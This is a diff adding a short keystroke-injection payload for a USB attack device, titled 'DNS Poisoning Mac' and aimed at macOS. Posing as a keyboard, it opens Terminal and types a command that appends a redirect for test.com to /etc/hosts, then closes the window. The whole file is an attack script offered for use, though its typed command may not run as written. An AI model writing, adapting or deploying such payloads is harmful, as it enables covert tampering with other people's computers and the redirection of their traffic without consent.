@@ -1,0 +1,23 @@
+#Title: DNS Poisoning Mac
+#Description: Attacks the host file to redirect a website of your chosing for a given domain
+#Author: thehappydinoa
+#Target: OS X
+
+LED R 200
+
+ATTACKMODE HID
+LED STAGE1
+Q DELAY 400
+Q GUI SPACE
+Q DELAY 300
+Q STRING terminal
+Q DELAY 200
+Q ENTER
+Q DELAY 400
+Q STRING 'echo 10.1.1.0 test.com>>/etc/hosts'
+Q DELAY 50
+Q ENTER
+Q STRING exit
+Q ENTER
+
+LED FINISH
